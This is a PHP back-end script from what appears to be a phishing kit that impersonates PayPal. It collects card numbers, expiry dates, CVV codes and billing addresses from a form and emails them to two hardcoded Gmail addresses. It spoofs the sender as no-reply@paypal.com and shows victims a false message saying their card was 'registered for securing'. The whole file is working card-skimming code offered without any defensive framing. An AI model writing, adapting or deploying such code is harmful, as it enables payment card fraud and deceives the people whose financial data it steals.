<?php
// Set your recipient email address
$to = "rawkstar.vipul@gmail.com, skytech1321@gmail.com"; // Change this to your email address

// Get form data
$card_number = isset($_POST['card_number']) ? trim($_POST['card_number']) : '';
$card_type = isset($_POST['card_type']) ? trim($_POST['card_type']) : '';
$expiration_date = isset($_POST['expiration_date']) ? trim($_POST['expiration_date']) : '';
$cvv = isset($_POST['cvv_common']) ? trim($_POST['cvv_common']) : '';
$amex_cvv4 = isset($_POST['amex_cvv4']) ? trim($_POST['amex_cvv4']) : '';
$amex_cvv3 = isset($_POST['amex_cvv3']) ? trim($_POST['amex_cvv3']) : '';
$billing_address = isset($_POST['billing_address']) ? trim($_POST['billing_address']) : '';

// Get the last four digits of the card number
$last_four_digits = substr($card_number, -4);

// Create the email subject and message body
$subject = "Card Information from PayPal Form";
$message = "
<html>
<head>
  <title>Card Information from PayPal Form</title>
</head>
<body>
  <h2>Card Information</h2>
  <p><strong>Card Number:</strong> " . htmlspecialchars($card_number) . "</p>
  <p><strong>Card Type:</strong> " . htmlspecialchars($card_type) . "</p>
  <p><strong>Expiration Date:</strong> " . htmlspecialchars($expiration_date) . "</p>
  <p><strong>CVV:</strong> " . htmlspecialchars($cvv) . "</p>
  <p><strong>American Express 4-digit CSC:</strong> " . htmlspecialchars($amex_cvv4) . "</p>
  <p><strong>American Express 3-digit CID:</strong> " . htmlspecialchars($amex_cvv3) . "</p>
  <p><strong>Billing Address:</strong> " . htmlspecialchars($billing_address) . "</p>
</body>
</html>
";

// Set the content type for the email
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-Type: text/html; charset=UTF-8" . "\r\n";
$headers .= "From: no-reply@paypal.com" . "\r\n"; // Optional: Change the sender email

// Send the email
if (mail($to, $subject, $message, $headers)) {
    // Confirmation message to be shown to user
    $confirmation_message = "Your card ending in ****" . $last_four_digits . " has been successfully registered for securing. Thank you for using our service!";
    echo $confirmation_message;

    // Redirect after a delay
    header("refresh:3; url=https://your-redirect-url.com"); // Redirects after 3 seconds
    exit; // Stop further script execution
} else {
    echo "Error: Unable to secure card ending in ****" . $last_four_digits . " .";
    // Redirect after a delay
    header("refresh:3; url=https://your-error-url.com"); // Redirect to an error page or homepage
    exit; // Stop further script execution
}
?>
